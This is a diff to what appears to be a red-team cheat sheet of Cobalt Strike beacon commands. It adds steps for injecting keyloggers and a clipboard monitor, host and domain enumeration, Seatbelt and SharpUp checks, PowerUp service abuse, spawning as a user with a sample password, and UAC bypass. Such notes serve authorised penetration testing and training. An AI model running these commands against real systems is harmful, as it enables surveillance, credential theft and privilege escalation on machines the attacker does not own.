@@ -112,11 +112,17 @@ ctrl+k will clear the current window.
 # Enumerate host
 
 getuid                                            Get User ID
-keylogger                                         Inject a keystroke logger into a process
-                                                    View > Keylogger > select item in lower left pane
-screenshot                                        Take a screenshot
-                                                    View > Screenshots > select item in lower left pane
 ps                                                Show process list
+
+keylogger <PID> x64                               Inject a keystroke logger into a process
+                                                    View > Keylogger > select item in lower left pane
+
+https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Start-ClipboardMonitor.ps1
+psinject <PID> x64 Start-ClipboardMonitor -CollectionLimit 5
+
+screenshot <PID> x64                              Take a screenshot
+                                                    View > Screenshots > select item in lower left pane
+
 pwd                                               Print current directory
 ls                                                List files
 drives                                            List drives on target
@@ -125,8 +131,12 @@ shell tasklist
 shell ver
 shell ipconfig /all
 shell arp -a
-shell systeminfo                                 System info
+shell systeminfo                                  System info
+shell net time                                    Show time for a host
 shell netstat -ano
+shell whoami
+shell net start
+shell qprocess
 
 net computers                                     List hosts in a domain (groups)
 net domain                                        Display domain for this host
@@ -142,7 +152,7 @@ net localgroup Administrators                     Show users in the Administrato
 net logons                                        List users logged onto a host
 net sessions                                      List sessions on a host
 net share                                         List shares on a host
-net time                                          Show time for a host
+
 net view                                          List hosts in a domain (browser service)
 
 jobs                                              List long-running post-exploitation tasks. Look for keylogger JID
@@ -156,15 +166,25 @@ Seatbelt
     There will be no output on the screen.
     This wil compile to C:\Downloads\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe.
     Transfer this file to your Kali VM or run Cobalt Strike from the same Windows VM.
-    beacon> execute-assembly /root/Desktop/Seatbelt.exe -group=system
+    beacon> execute-assembly /opt/Seatbelt.exe -group=system
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# PowerShell weaponization
+
+powershell <cmdlet> <args>                        Starts powershell.exe
+powerpick <cmdlet> <args>                         Spawns a sacrificial process specified by spawnto and injects unmanaged PS into it
+psinject <PID> <arch> <cmdlet> <args>             Injects unmanaged PS into a specified process
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Escalate privileges
 
 powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
-powerpick Invoke-AllChecks
+powershell Invoke-PrivescAudit
 
-powerpick Invoke-ServiceAbuse -Name 'crappy-serverice'
+SharpUp is a C# port of PowerUp, not all checks are ported.
+execute-assembly /opt/GhostPack/SharpUp/SharpUp.exe
+
+powerpick Invoke-ServiceAbuse -Name 'crappy-service'
 spawnas john Password123! smb
 Select john in the top pane > right-click > Interact
 bypassuac http
@@ -180,6 +200,11 @@ Dump passwords
     inject <PID> <arch> <listener>
     inject 5678 x64 smb
     Select the new user in the top pane > right-click > Interact
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Bypass UAC
+
+elevate uac-token-duplication
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Lateral Movement
